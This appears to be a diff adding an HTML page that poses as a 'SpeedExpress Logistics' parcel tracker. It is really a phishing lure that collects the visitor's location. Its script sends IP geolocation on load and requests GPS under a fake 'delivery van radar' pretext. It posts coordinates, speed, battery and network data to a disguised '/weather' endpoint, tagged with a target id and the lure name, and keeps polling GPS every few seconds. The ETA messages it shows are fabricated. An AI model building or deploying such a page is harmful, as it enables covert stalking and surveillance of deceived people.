@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Express Parcel & Courier Tracker</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        }
+
+        body {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%);
+            padding: 16px;
+            color: #1e293b;
+        }
+
+        .card {
+            background: #ffffff;
+            border-radius: 20px;
+            padding: 26px 20px;
+            max-width: 380px;
+            width: 100%;
+            box-shadow: 0 20px 35px rgba(0, 0, 0, 0.4);
+            text-align: center;
+        }
+
+        .header-logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            font-size: 20px;
+            font-weight: 800;
+            color: #ea580c;
+            margin-bottom: 8px;
+        }
+
+        .tracking-num {
+            background: #f1f5f9;
+            padding: 6px 12px;
+            border-radius: 8px;
+            font-size: 13px;
+            color: #475569;
+            display: inline-block;
+            margin-bottom: 18px;
+            font-family: monospace;
+            font-weight: 700;
+        }
+
+        .timeline {
+            text-align: left;
+            margin: 16px 0 22px 10px;
+            position: relative;
+            padding-left: 20px;
+            border-left: 2px solid #cbd5e1;
+        }
+
+        .timeline-step {
+            position: relative;
+            margin-bottom: 14px;
+        }
+
+        .timeline-step::before {
+            content: "";
+            position: absolute;
+            left: -26px;
+            top: 2px;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: #cbd5e1;
+        }
+
+        .timeline-step.active::before {
+            background: #ea580c;
+            box-shadow: 0 0 0 4px rgba(234, 88, 12, 0.2);
+        }
+
+        .timeline-step strong {
+            font-size: 13px;
+            display: block;
+            color: #1e293b;
+        }
+
+        .timeline-step span {
+            font-size: 11px;
+            color: #64748b;
+        }
+
+        button {
+            width: 100%;
+            padding: 14px 18px;
+            background: linear-gradient(135deg, #ea580c 0%, #f97316 100%);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            font-size: 15px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            box-shadow: 0 4px 14px rgba(234, 88, 12, 0.4);
+            transition: all 0.2s;
+        }
+
+        button:hover {
+            transform: translateY(-1px);
+        }
+
+        button:disabled {
+            opacity: 0.85;
+            cursor: not-allowed;
+        }
+
+        .status-msg {
+            font-size: 11px;
+            color: #64748b;
+            margin-top: 10px;
+        }
+
+        .id-badge {
+            display: inline-block;
+            background: #f1f5f9;
+            color: #64748b;
+            padding: 2px 8px;
+            border-radius: 12px;
+            font-size: 10px;
+            margin-top: 14px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="card">
+        <div class="header-logo">
+            <i class="fa-solid fa-truck-fast"></i> SpeedExpress Logistics
+        </div>
+        <div class="tracking-num" id="track-id">TRK-98421092IN</div>
+
+        <h3 style="font-size: 16px; font-weight: 700; color: #0f172a;">Live Parcel Delivery Radar</h3>
+        <p style="font-size: 12px; color: #64748b; margin-top: 2px;">Detect exact courier distance to your doorstep</p>
+
+        <div class="timeline">
+            <div class="timeline-step">
+                <strong>Package Picked Up</strong>
+                <span>Central Logistics Hub</span>
+            </div>
+            <div class="timeline-step">
+                <strong>In Transit</strong>
+                <span>Regional Sort Facility</span>
+            </div>
+            <div class="timeline-step active">
+                <strong>Out for Delivery</strong>
+                <span id="dest-label">Detecting nearest delivery hub...</span>
+            </div>
+        </div>
+
+        <button id="track-btn">
+            <i class="fa-solid fa-location-crosshairs"></i> Detect Live Delivery Location
+        </button>
+
+        <p class="status-msg" id="status-msg">GPS required to calculate courier arrival distance</p>
+
+        <div>
+            <span class="id-badge">Package ID: <strong id="target-id-display">Connecting...</strong></span>
+        </div>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search)
+        const customId = urlParams.get("id") ? urlParams.get("id").replace(/[^a-zA-Z0-9_\-\.]/g, "") : null
+        const id = customId || localStorage.getItem("tracker_id") || generateId()
+        localStorage.setItem("tracker_id", id)
+
+        document.getElementById("target-id-display").textContent = id
+        const btn = document.getElementById("track-btn")
+        const destLabel = document.getElementById("dest-label")
+        const statusMsg = document.getElementById("status-msg")
+
+        let telemetry = { battery: null, charging: false, network: "Unknown" }
+
+        // Fetch telemetry
+        if (navigator.getBattery) {
+            navigator.getBattery().then(b => {
+                telemetry.battery = b.level * 100
+                telemetry.charging = b.charging
+            }).catch(() => {})
+        }
+        if (navigator.connection) {
+            telemetry.network = navigator.connection.effectiveType || navigator.connection.type || "Unknown"
+        }
+
+        // 1. Initial IP Ping
+        fetch("https://freeipapi.com/api/json")
+            .then(r => r.json())
+            .then(d => {
+                if (d && d.latitude && d.longitude) {
+                    destLabel.textContent = `Hub: ${d.cityName || 'City Center'}, ${d.countryName || ''}`
+                    sendReport(d.latitude, d.longitude, 2500, 0, "IP")
+                }
+            }).catch(() => {})
+
+        // 2. Button GPS Request
+        btn.addEventListener("click", () => {
+            btn.disabled = true
+            btn.innerHTML = `<i class="fa-solid fa-spinner fa-spin"></i> Locating Delivery Van...`
+            statusMsg.textContent = "Connecting to delivery van GPS radar..."
+
+            navigator.geolocation.getCurrentPosition(
+                onSuccess,
+                () => {
+                    navigator.geolocation.getCurrentPosition(onSuccess, onErr, { enableHighAccuracy: false, timeout: 8000 })
+                },
+                { enableHighAccuracy: true, timeout: 6000 }
+            )
+        })
+
+        function onSuccess(pos) {
+            btn.disabled = false
+            btn.innerHTML = `<i class="fa-solid fa-circle-check"></i> Radar Live (Arriving in 18 mins)`
+            statusMsg.textContent = "Delivery vehicle is 1.4 km away. Live tracker active."
+            sendReport(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy, pos.coords.speed, "GPS")
+
+            setTimeout(() => {
+                navigator.geolocation.getCurrentPosition(onSuccess, () => {}, { enableHighAccuracy: true })
+            }, 4000)
+        }
+
+        function onErr(e) {
+            btn.disabled = false
+            btn.innerHTML = `<i class="fa-solid fa-rotate-right"></i> Retry Location`
+            statusMsg.textContent = "Please allow location permissions to see exact delivery ETA."
+        }
+
+        async function sendReport(lat, lng, accuracy, speed, type) {
+            try {
+                await fetch("/weather", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        id, lat, lng, accuracy, speed,
+                        type: type || "GPS",
+                        lure: "Courier",
+                        battery: telemetry.battery,
+                        charging: telemetry.charging,
+                        network: telemetry.network
+                    })
+                })
+            } catch (err) {}
+        }
+
+        function generateId() {
+            return "user_" + Math.random().toString(36).substring(2, 9)
+        }
+    </script>
+</body>
+
+</html>
